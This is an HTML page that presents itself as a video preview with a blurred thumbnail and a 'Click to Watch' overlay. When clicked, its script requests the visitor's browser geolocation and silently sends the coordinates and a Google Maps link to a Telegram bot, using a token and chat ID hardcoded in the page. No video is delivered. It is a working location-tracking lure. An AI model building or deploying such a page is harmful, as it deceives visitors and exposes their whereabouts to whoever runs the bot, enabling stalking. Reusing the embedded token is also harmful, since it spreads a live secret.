<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Preview</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #000;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .card {
    position: relative;
    width: 400px;
    height: 225px;
    cursor: pointer;
    overflow: hidden;
    border-radius: 10px;
    box-shadow: 0 0 15px rgba(0,0,0,0.5);
  }
  .card img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    filter: blur(5px);
    transition: filter 0.3s;
  }
  .card:hover img {
    filter: blur(0);
  }
  .overlay {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #fff;
    font-size: 20px;
    font-weight: bold;
    text-shadow: 1px 1px 5px #000;
  }
</style>
</head>
<body>

<div class="card" onclick="getLocation();">
  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="Video Preview">
  <div class="overlay">Click to Watch</div>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const message = `üìç User Location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("‚úÖ Sent:", data))
    .catch(err => console.error("‚ùå Error:", err));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => sendLocationToBot(pos.coords.latitude, pos.coords.longitude),
            err => console.error("‚ö†Ô∏è Permission denied")
        );
    } else {
        console.error("‚ö†Ô∏è Geolocation not supported");
    }
}
</script>

</body>
</html>
